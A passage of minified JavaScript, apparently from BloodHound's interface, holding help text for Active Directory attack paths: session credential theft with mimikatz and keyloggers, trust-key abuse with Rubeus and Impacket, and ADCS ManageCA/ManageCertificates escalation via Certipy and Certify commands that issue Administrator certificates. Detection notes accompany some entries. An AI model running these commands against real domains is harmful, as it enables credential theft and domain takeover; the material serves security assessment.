noreferrer",href:"https://adsecurity.org/?p=1772",children:"https://adsecurity.org/?p=1772"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://adsecurity.org/?tag=sidhistory",children:"https://adsecurity.org/?tag=sidhistory"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/techniques/T1178/",children:"https://attack.mitre.org/techniques/T1178/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/",children:"https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/"})]}),pu={general:lu,abuse:cu,opsec:du,references:hu},uu=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Password Theft"}),e.jsx(t,{variant:"body2",children:"When a user has a session on the computer, you may be able to obtain credentials for the user via credential dumping or token impersonation. You must be able to move laterally to the computer, have administrative access on the computer, and the user must have a non-network logon session on the computer."}),e.jsx(t,{variant:"body2",children:"Once you have established a Cobalt Strike Beacon, Empire agent, or other implant on the target, you can use mimikatz to dump credentials of the user that has a session on the computer. While running in a high integrity process with SeDebugPrivilege, execute one or more of mimikatz's credential gathering techniques (e.g.: sekurlsa::wdigest, sekurlsa::logonpasswords, etc.), then parse or investigate the output to find clear-text credentials for other users logged onto the system."}),e.jsx(t,{variant:"body2",children:`You may also gather credentials when a user types them or copies them to their clipboard! Several keylogging capabilities exist, several agents and toolsets have them built-in. For instance, you may use meterpreter's "keyscan_start" command to start keylogging a user, then "keyscan_dump" to return the captured keystrokes. Or, you may use PowerSploit's Invoke-ClipboardMonitor to periodically gather the contents of the user's clipboard.`}),e.jsx(t,{variant:"body1",children:"Token Impersonation"}),e.jsx(t,{variant:"body2",children:"You may run into a situation where a user is logged onto the system, but you can't gather that user's credential. This may be caused by a host-based security product, lsass protection, etc. In those circumstances, you may abuse Windows' token model in several ways. First, you may inject your agent into that user's process, which will give you a process token as that user, which you can then use to authenticate to other systems on the network. Or, you may steal a process token from a remote process and start a thread in your agent's process with that user's token. For more information about token abuses, see the References tab."}),e.jsx(t,{variant:"body2",children:"User sessions can be short lived and only represent the sessions that were present at the time of collection. A user may have ended their session by the time you move to the computer to target them. However, users tend to use the same machines, such as the workstations or servers they are assigned to use for their job duties, so it can be valuable to check multiple times if a user session has started."})]}),mu=({sourceName:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The user ",a," has a session on the computer ",r,"."]}),e.jsx(t,{variant:"body2",children:"When a user authenticates to a computer, they often leave credentials exposed on the system, which can be retrieved through LSASS injection, token manipulation/theft, or injecting into a user's process."}),e.jsx(t,{variant:"body2",children:"Any user that is an administrator to the system has the capability to retrieve the credential material from memory if it still exists."}),e.jsx(t,{variant:"body2",children:"Note: A session does not guarantee credential material is present, only possible."})]}),bu=()=>e.jsx(t,{variant:"body2",children:"An EDR product may detect your attempt to inject into lsass and alert a SOC analyst. There are many more opsec considerations to keep in mind when stealing credentials or tokens. For more information, see the References tab."}),fu=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(t,{variant:"body1",children:"Gathering Credentials"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"http://blog.gentilkiwi.com/mimikatz",children:"http://blog.gentilkiwi.com/mimikatz"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/gentilkiwi/mimikatz",children:"https://github.com/gentilkiwi/mimikatz"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://adsecurity.org/?page_id=1821",children:"https://adsecurity.org/?page_id=1821"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/wiki/Credential_Access",children:"https://attack.mitre.org/wiki/Credential_Access"}),e.jsx(t,{variant:"body1",children:"Token Impersonation"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.exploit-db.com/docs/english/13054-security-implications-of-windows-access-tokens.pdf",children:"https://www.exploit-db.com/docs/english/13054-security-implications-of-windows-access-tokens.pdf"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/wiki/Technique/T1134",children:"https://attack.mitre.org/wiki/Technique/T1134"})]}),yu={general:mu,abuse:uu,opsec:bu,references:fu},gu=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Step 1: Obtain Trust Keys"}),e.jsx(t,{variant:"body2",children:"Trust keys can be dumped with administrative access to a domain controller of the source domain."}),e.jsx(t,{variant:"body2",children:"On Windows, use Mimikatz to dump the trust keys:"}),e.jsx(w,{children:"lsadump::trust /patch"}),e.jsx(t,{variant:"body2",children:'The trust keys for the target trust account appear under "[ Out ]" for the target domain.'}),e.jsx(t,{variant:"body1",children:"Step 2: Authenticate as the Trust Account"}),e.jsx(t,{variant:"body2",children:"The RC4 version of the trust keys serves as the RC4 Kerberos secret key for the trust account. This can be used directly to request a Kerberos Ticket-Granting Ticket (TGT)."}),e.jsxs(t,{variant:"body2",children:["The AES trust keys are not identical to the AES Kerberos secret keys of the trust account due to different salt values. However, you can derive the AES Kerberos secret keys using the cleartext trust key and tools like krbrelayx.py. (See reference:"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://snovvcrash.rocks/2021/05/21/calculating-kerberos-keys.html",children:"A Note on Calculating Kerberos Keys for AD Accounts"})," ",")."]}),e.jsxs(t,{variant:"body2",children:["When authenticating as a trust account, there are two key limitations:",e.jsxs("ol",{style:{listStyleType:"decimal",paddingLeft:"1.5em"},children:[e.jsx("li",{children:"Only Kerberos authentication is supported (NTLM authentication is not possible)"}),e.jsx("li",{children:"Only network logins work (interactive logins such as RUNAS, console login, and RDP are not possible)"})]})]}),e.jsx(t,{variant:"body2",children:"On Windows, use Rubeus to obtain a TGT:"}),e.jsx(w,{children:"Rubeus.exe asktgt /user:<trust account SAMAccountName> /domain:<target domain DNS name> /rc4:<RC4 trust key> /nowrap /ptt"}),e.jsx(t,{variant:"body2",children:"On Linux, use Impacket's getTGT.py to obtain a TGT:"}),e.jsx(w,{children:"python getTGT.py <target domain DNS name>/<trust account SAMAccountName> -hashes : <RC4 trust key>"})]}),xu=({sourceName:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The domain ",r," has the trust keys of the trust account ",a,". The trust account exists because the source domain has an outbound trust to the domain of the trust account."]}),e.jsx(t,{variant:"body2",children:"The trust keys can be leveraged to authenticate as the trust account and gain access to the trust account's domain."})]}),ju=()=>e.jsxs(t,{variant:"body2",children:["Authentication via a trust account is unusual and can be detected by Windows security events with the account name of a trust account. Specifically, monitor for:",e.jsxs("ul",{children:[e.jsx("li",{children:"Event ID 4768 - A Kerberos authentication ticket (TGT) was requested"}),e.jsx("li",{children:"Event ID 4624 - A successful account login"})]})]}),wu=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted",children:"SID filter as security boundary between domains? (Part 7) - Trust account attack"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/gentilkiwi/mimikatz",children:"Mimikatz GitHub"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/dirkjanm/krbrelayx",children:"krbrelayx GitHub"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://snovvcrash.rocks/2021/05/21/calculating-kerberos-keys.html",children:"A Note on Calculating Kerberos Keys for AD Accounts"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Rubeus",children:"Rubeus GitHub"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/fortra/impacket/blob/master/examples/getTGT.py",children:"Impacket getTGT.py"})]}),vu={general:xu,abuse:gu,opsec:ju,references:wu},Au=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The ",N(a)," ",r," hosts the enrollment service for the enterprise CA"," ",o,"."]}),e.jsx(t,{variant:"body2",children:"The Enterprise Certification Authority node is the enrollment service LDAP object for CA hosted on the computer node."})]}),Su=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform several attacks that rely on this relationship. This relationship alone is not enough to escalate rights or impersonate other principals. The enterprise CA must chain up to a root CA of the AD forest and it must be trusted for NT authentication in the AD forest for an escalation to be possible. If both conditions are met, BloodHound will generate a GoldenCert edge from the computer node to the domain node. Check if there is an outbound GoldenCert edge from the computer node."}),Cu=()=>e.jsx(t,{variant:"body2",children:"When an attacker abuses a privilege escalation or impersonation primitive that relies on this relationship, it will necessarily result in the issuance of a certificate. A copy of the issued certificate will be saved on the host that issued the certificate."}),ku=()=>e.jsx(l,{sx:{overflowX:"auto"},children:e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"})}),Tu=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform several attacks that rely on this relationship. This relationship alone is not enough to escalate rights or impersonate other principals. The enterprise CA must chain up to a root CA of the AD forest and it must be trusted for NT authentication in the AD forest for an escalation to be possible. If both conditions are met, BloodHound will generate a GoldenCert edge from the computer node to the domain node. Check if there is an outbound GoldenCert edge from the computer node."}),Pu={general:Au,windowsAbuse:Tu,linuxAbuse:Su,opsec:Cu,references:ku},Du=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The ",N(a)," ",r,"'s certificate is issued and signed by ",o]}),e.jsx(t,{variant:"body2",children:"When Windows assesses the validity and trustworthiness of a certificate it verifies the certificate chain up to a trusted root certificate. The IssuedSignedBy edge represent a link within the certificate chain."})]}),Ou=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform several attacks that rely on the certificate chain, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."}),Ru=()=>e.jsx(t,{variant:"body2",children:"When an attacker abuses a privilege escalation or impersonation primitive that relies on this relationship, it will necessarily result in the issuance of a certificate. A copy of the issued certificate will be saved on the host that issued the certificate."}),Eu=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"Certified Pre-Owned ADCS Whitepaper"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication#BKMK_CertificatesInWindowsAuthentication",children:"Credentials Processes in Windows Authentication"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.pkisolutions.com/understanding-active-directory-certificate-services-containers-in-active-directory/",children:"Understanding Active Directory Certificate Services Containers in Active Directory"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.ravenswoodtechnology.com/components-of-a-pki-part-2/",children:"Components of a PKI, Part 2: Certificate Authorities and CA Hierarchies"})]}),Iu=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform several attacks that rely on the certificate chain, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."}),$u={general:Du,windowsAbuse:Iu,linuxAbuse:Ou,opsec:Ru,references:Eu},Gu=({sourceName:r})=>e.jsx(e.Fragment,{children:e.jsxs(t,{variant:"body2",children:["The principal ",r,' has the "Manage CA", also known as "CA Administrator", permission on the EnterpriseCA. This permission allows the principal to configure the CA to allow subject alternate names, publish certificate templates, grant "Manage Certificates" and more.']})}),Nu=()=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["CA Administrators can perform the following actions that may enable an ADCS escalation:",e.jsxs("ol",{style:{listStyleType:"decimal",paddingLeft:"1.5em"},children:[e.jsx("li",{children:"Grant CA officer (ManageCertificates) and approve a denied certificate request"}),e.jsx("li",{children:"Publish a certificate template"}),e.jsx("li",{children:"Grant enroll on enterprise CA"}),e.jsxs("li",{children:["Enable the ESC6 CA flag ",e.jsx("code",{children:"EDITF_ATTRIBUTESUBJECTALTNAME2"})]}),e.jsxs("li",{children:["Enable the ESC11 CA flag ",e.jsx("code",{children:"IF_ENFORCEENCRYPTICERTREQUEST"})]}),e.jsx("li",{children:"Disable the security extension on the enterprise CA (ESC16)"}),e.jsx("li",{children:"Abuse a CDP to coerce and relay the CA server"}),e.jsx("li",{children:"Abuse a CDP to obtain RCE on the CA server via a webshell"})]})]}),e.jsx(t,{variant:"body1",children:"Grant CA officer (ManageCertificates) and approve a denied certificate request"}),e.jsx(t,{variant:"body2",children:"The combination of the ManageCA and ManageCertificates permissions allow the attacker to approve certificate requests that were denied because lack of enrollment rights on the certificate template or on the enterprise CA. A common action is therefore to grant this permission, enroll in an ESC1 template that the attacker does not have enrollment rights on, issue the certificate of the denied request. This attack fails if role separation is enabled on the CA, as it enforces that users cannot have both ManageCA and ManageCertificates. However, this setting is very rare."}),e.jsx(t,{variant:"body2",children:"Certipy allow you to grant the CA officer role:"}),e.jsx(t,{component:"pre",children:"certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd"}),e.jsx(t,{variant:"body2",children:"Issue the certificate request by the request ID:"}),e.jsx(t,{component:"pre",children:"certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd"}),e.jsx(t,{variant:"body2",children:"Download the certificate with this command:"}),e.jsx(t,{component:"pre",children:"certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785"}),e.jsx(t,{variant:"body1",children:"Publish a certificate template"}),e.jsx(t,{variant:"body2",children:"Certificate templates, that for example enable ESC1, can be published/unpublished to the CA using Certipy:"}),e.jsx(t,{component:"pre",children:"certipy ca -ca 'corp-DC-CA' -enable-template TemplateCN -username john@corp.local -password Passw0rd"}),e.jsxs(t,{variant:"body2",children:["See the ADCS ESC1 abuse information for details on the execution of the remaining part of that attack:"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/adcs-esc1",children:"BloodHound Docs: ADCSESC1"}),"."]}),e.jsx(t,{variant:"body1",children:"Grant enroll on enterprise CA"}),e.jsx(t,{variant:"body2",children:"See Windows abuse."}),e.jsxs(t,{variant:"body1",children:["Enable the ESC6 CA flag ",e.jsx("code",{children:"EDITF_ATTRIBUTESUBJECTALTNAME2"})]}),e.jsx(t,{variant:"body2",children:"See Windows abuse."}),e.jsxs(t,{variant:"body1",children:["Enable the ESC11 CA flag ",e.jsx("code",{children:"IF_ENFORCEENCRYPTICERTREQUEST"})]}),e.jsx(t,{variant:"body2",children:"See Windows abuse."}),e.jsx(t,{variant:"body1",children:"Disable the security extension on the enterprise CA (ESC16)"}),e.jsx(t,{variant:"body2",children:"See Windows abuse."}),e.jsx(t,{variant:"body1",children:"Abuse a CDP to coerce and relay the CA server"}),e.jsxs(t,{variant:"body2",children:["For more information, please refer to this blogpost:"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.tarlogic.com/blog/ad-cs-manageca-rce/",children:"AD CS: from ManageCA to RCE"}),"."]}),e.jsx(t,{variant:"body1",children:"Abuse a CDP to obtain RCE on the CA server via a webshell"}),e.jsxs(t,{variant:"body2",children:["For more information, please refer to this blogpost:"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.tarlogic.com/blog/ad-cs-manageca-rce/",children:"AD CS: from ManageCA to RCE"}),"."]})]}),Mu=()=>e.jsx(t,{variant:"body2",children:"When an attacker abuses a privilege escalation or impersonation primitive that relies on this relationship, it will necessarily result in the issuance of a certificate. A copy of the issued certificate will be saved on the host that issued the certificate."}),Lu=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"Certified Pre-Owned"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Certify/wiki/4-%E2%80%90-Escalation-Techniques#manageca",children:"Certify wiki - Escalation Techniques - ManageCA"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca",children:"ESC7: Dangerous Permissions on CA"}),e.jsx("br",{})]}),Fu=()=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["CA Administrators can perform the following actions that may enable an ADCS escalation:",e.jsxs("ol",{style:{listStyleType:"decimal",paddingLeft:"1.5em"},children:[e.jsx("li",{children:"Grant CA officer (ManageCertificates) and approve a denied certificate request"}),e.jsx("li",{children:"Publish a certificate template"}),e.jsx("li",{children:"Grant enroll on enterprise CA"}),e.jsxs("li",{children:["Enable the ESC6 CA flag ",e.jsx("code",{children:"EDITF_ATTRIBUTESUBJECTALTNAME2"})]}),e.jsxs("li",{children:["Enable the ESC11 CA flag ",e.jsx("code",{children:"IF_ENFORCEENCRYPTICERTREQUEST"})]}),e.jsx("li",{children:"Disable the security extension on the enterprise CA (ESC16)"}),e.jsx("li",{children:"Abuse a CDP to coerce and relay the CA server"}),e.jsx("li",{children:"Abuse a CDP to obtain RCE on the CA server via a webshell"})]})]}),e.jsx(t,{variant:"body1",children:"Grant CA officer (ManageCertificates) and approve a denied certificate request"}),e.jsx(t,{variant:"body2",children:"The combination of the ManageCA and ManageCertificates permissions allow the attacker to approve certificate requests that were denied because lack of enrollment rights on the certificate template or on the enterprise CA. A common action is therefore to grant this permission, enroll in an ESC1 template that the attacker does not have enrollment rights on, issue the certificate of the denied request. This attack fails if role separation is enabled on the CA, as it enforces that users cannot have both ManageCA and ManageCertificates. However, this setting is very rare."}),e.jsx(t,{variant:"body2",children:"A principal can be granted/revoked CA Officer with Certify (v2.0) with this command:"}),e.jsx(t,{component:"pre",children:"Certify.exe manage-ca --ca ca01.corp.local\\CORP-CA01-CA --officer S-1-5-21-976219687-1556195986-4104514715-12345"}),e.jsx(t,{variant:"body2",children:"Then, an ESC1 certificate is requested:"}),e.jsx(t,{component:"pre",children:"Certify.exe request --ca ca01.corp.local\\CORP-CA01-CA --template CustomUser --upn Administrator --sid S-1-5-21-976219687-1556195986-4104514715-500"}),e.jsx(t,{variant:"body2",children:"Check the printed private key and the request ID."}),e.jsx(t,{variant:"body2",children:"Approve the certificate request by the request ID:"}),e.jsx(t,{component:"pre",children:"Certify.exe manage-ca --ca ca01.corp.local\\CORP-CA01-CA --issue-id 1337"}),e.jsx(t,{variant:"body2",children:"Download the certificate and get the pfx base-64:"}),e.jsx(t,{component:"pre",children:"Certify.exe request-download --ca ca01.corp.local\\CORP-CA01-CA --id 1337 --private-key LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQ0KT..."}),e.jsx(t,{variant:"body2",children:"Authenticate with the certificate using Rubeus:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe asktgt /user:Administrator /certificate:MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh... /ptt"}),e.jsx(t,{variant:"body1",children:"Publish a certificate template"}),e.jsx(t,{variant:"body2",children:"Certificate templates, that for example enable ESC1, can be published/unpublished to the CA using Certify (v2.0) with this command:"}),e.jsx(t,{component:"pre",children:"Certify.exe manage-ca --ca ca01.corp.local\\CORP-CA01-CA --template MyTemplate"}),e.jsxs(t,{variant:"body2",children:["See the ADCS ESC1 abuse information for details on the execution of the remaining part of that attack:"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/adcs-esc1",children:"BloodHound Docs: ADCSESC1"}),"."]}),e.jsx(t,{variant:"body1",children:"Grant enroll on enterprise CA"}),e.jsx(t,{variant:"body2",children:"Enrollment rights on the enterprise CA is required to enroll certificates."}),e.jsx(t,{variant:"body2",children:"A principal can be granted/revoked Enroll on the CA with Certify (v2.0) with this command:"}),e.jsx(t,{component:"pre",children:"Certify.exe manage-ca --ca ca01.corp.local\\CORP-CA01-CA --enroll S-1-5-21-976219687-1556195986-4104514715-12345"}),e.jsxs(t,{variant:"body1",children:["Enable the ESC6 CA flag ",e.jsx("code",{children:"EDITF_ATTRIBUTESUBJECTALTNAME2"})]}),e.jsxs(t,{variant:"body2",children:["The ",e.jsx("code",{children:"EDITF_ATTRIBUTESUBJECTALTNAME2"})," flag can be enabled/disabled with Certify (2.0) using this command:"]}),e.jsx(t,{component:"pre",children:"Certify.exe manage-ca --ca ca01.corp.local\\CORP-CA01-CA --esc6"}),e.jsx(t,{variant:"body2",children:"The change does not apply until the CA service is restarted. Restarting the CA service requires admin rights on the CA host."}),e.jsxs(t,{variant:"body2",children:["See the ADCS ESC6 abuse information for details on the execution of the remaining part of that attack:"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/adcs-esc6a",children:"BloodHound Docs: ADCSESC6a"}),"."]}),e.jsxs(t,{variant:"body1",children:["Enable the ESC11 CA flag ",e.jsx("code",{children:"IF_ENFORCEENCRYPTICERTREQUEST"})]}),e.jsxs(t,{variant:"body2",children:["The ",e.jsx("code",{children:"IF_ENFORCEENCRYPTICERTREQUEST"})," flag can be enabled/disabled with Certify (2.0) using this command:"]}),e.jsx(t,{component:"pre",children:"Certify.exe manage-ca --ca ca01.corp.local\\CORP-CA01-CA --esc11-req"}),e.jsx(t,{variant:"body2",children:"The change does not apply until the CA service is restarted. Restarting the CA service requires admin rights on the CA host."}),e.jsxs(t,{variant:"body2",children:["See the ADCS ESC11 abuse information for details on the execution of the remaining part of that attack:"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/coerce-and-relay-ntlm-to-adcs-rpc",children:"BloodHound Docs: CoerceAndRelayNTLMToADCSRPC"}),"."]}),e.jsx(t,{variant:"body1",children:"Disable the security extension on the enterprise CA (ESC16)"}),e.jsx(t,{variant:"body2",children:"The CA settings required for ESC16 can be enabled/disabled with Certify (2.0) using this command:"}),e.jsx(t,{component:"pre",children:"Certify.exe manage-ca --ca ca01.corp.local\\CORP-CA01-CA --esc16"}),e.jsx(t,{variant:"body2",children:"The change does not apply until the CA service is restarted. Restarting the CA service requires admin rights on the CA host."}),e.jsxs(t,{variant:"body2",children:["See the ADCS ESC16 abuse information for details on the execution of the remaining part of that attack:"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://bloodhound.specterops.io/resources/edges/adcs-esc16",children:"BloodHound Docs: ADCSESC16"}),"."]}),e.jsx(t,{variant:"body1",children:"Abuse a CDP to coerce and relay the CA server"}),e.jsxs(t,{variant:"body2",children:["For more information, please refer to this blogpost:"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.tarlogic.com/blog/ad-cs-manageca-rce/",children:"AD CS: from ManageCA to RCE"}),"."]}),e.jsx(t,{variant:"body1",children:"Abuse a CDP to obtain RCE on the CA server via a webshell"}),e.jsxs(t,{variant:"body2",children:["For more information, please refer to this blogpost:"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.tarlogic.com/blog/ad-cs-manageca-rce/",children:"AD CS: from ManageCA to RCE"}),"."]})]}),_u={general:Gu,windowsAbuse:Fu,linuxAbuse:Nu,opsec:Mu,references:Lu},Uu=({sourceName:r})=>e.jsx(e.Fragment,{children:e.jsxs(t,{variant:"body2",children:["The principal ",r,' has the "Manage Certificates", also known as "CA Officer", permission on the Enterprise CA. This permission allows the principal to approve certificate requests that require manager approval.']})}),Wu=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"An attacker can identify ADCS escalation opportunities where manager approval on the certificate template prevents direct abuse, but leverage the Certificate Manager role to approve the pending certificate request."}),e.jsxs(t,{variant:"body2",children:["Alternatively, an attacker can abuse the Certificate Manager role to add an extension to pending certificates, which can be abused to add a group-linked issuance policy in environments using Authentication Mechanism Assurance (AMA). See"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Certify/wiki/4-%E2%80%90-Escalation-Techniques#managecertificates",children:"Certify wiki - Escalation Techniques - ManageCertificates"})," ","for details."]}),e.jsx(t,{variant:"body2",children:"Certificate managers can approve pending certificate requests using Certipy:"}),e.jsx(t,{component:"pre",children:"certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd"}),e.jsx(t,{variant:"body2",children:"Download the certificate with this command:"}),e.jsx(t,{component:"pre",children:"certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785"})]}),Bu=()=>e.jsx(t,{variant:"body2",children:"When an attacker abuses a privilege escalation or impersonation primitive that relies on this relationship, it will necessarily result in the issuance of a certificate. A copy of the issued certificate will be saved on the host that issued the certificate."}),qu=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"Certified Pre-Owned"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Certify/wiki/4-%E2%80%90-Escalation-Techniques#managecertificates",children:"Certify wiki - Escalation Techniques - ManageCertificates"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca",children:"ESC7: Dangerous Permissions on CA"}),e.jsx("br",{})]}),Ku=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"An attacker can identify ADCS escalation opportunities where manager approval on the certificate template prevents direct abuse, but leverage the Certificate Manager role to approve the pending certificate request. An example of abuse is covered here."}),e.jsxs(t,{variant:"body2",children:["Alternatively, an attacker can abuse the Certificate Manager role to add an extension to pending certificates, which can be abused to add a group-linked issuance policy in environments using Authentication Mechanism Assurance (AMA). See"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Certify/wiki/4-%E2%80%90-Escalation-Techniques#managecertificates",children:"Certify wiki - Escalation Techniques - ManageCertificates"})," ","for details."]}),e.jsx(t,{variant:"body2",children:"A certificate can be requested with Certify (v2.0):"}),e.jsx(t,{component:"pre",children:"Certify.exe request --ca ca01.corp.local\\CORP-CA01-CA --template CustomUser --upn Administrator --sid S-1-5-21-976219687-1556195986-4104514715-500"}),e.jsx(t,{variant:"body2",children:"Check the printed private key and the request ID."}),e.jsx(t,{variant:"body2",children:"Approve the certificate request by the request ID:"}),e.jsx(t,{component:"pre",children:"Certify.exe manage-ca --ca ca01.corp.local\\CORP-CA01-CA --issue-id 1337"}),e.jsx(t,{variant:"body2",children:"Download the certificate and get the pfx base-64:"}),e.jsx(t,{component:"pre",children:"Certify.exe request-download --ca ca01.corp.local\\CORP-CA01-CA --id 1337 --private-key LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQ0KT..."}),e.jsx(t,{variant:"body2",children:"Authenticate with the certificate using Rubeus:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe asktgt /user:Administrator /certificate:MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh... /ptt"})]}),zu={general:Uu,windowsAbuse:Ku,linuxAbuse:Wu,opsec:Bu,references:qu},Hu=()=>e.jsx(t,{variant:"body2",children:"No abuse is necessary. This edge simply indicates that a principal belongs to a security group."}),Vu=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The ",N(a)," ",r," is a member of the group ",o,"."]}),e.jsx(t,{variant:"body2",children:"Groups in active directory grant their members any privileges the group itself has. If a group has rights to another principal, users/computers in the group, as well as other groups inside the group inherit those permissions."})]}),Yu=()=>e.jsx(t,{variant:"body2",children:"No opsec considerations apply to this edge."}),Qu=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://adsecurity.org/?tag=ad-delegation",children:"https://adsecurity.org/?tag=ad-delegation"}),e.jsx("br",{}),e.jsxs(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.itprotoday.com/management-mobility/view-or-remove-active-directory-delegated-permissions ",children:["https://www.itprotoday.com/management-mobility/view-or-remove-active-directory-delegated-permissions"," "]})]}),Ju={general:Vu,abuse:Hu,opsec:Yu,references:Qu},Xu=({targetName:r})=>e.jsx(e.Fragment,{children:e.jsxs(t,{variant:"body2",children:["The NTAuthStore is the Enterprise NTAuth store 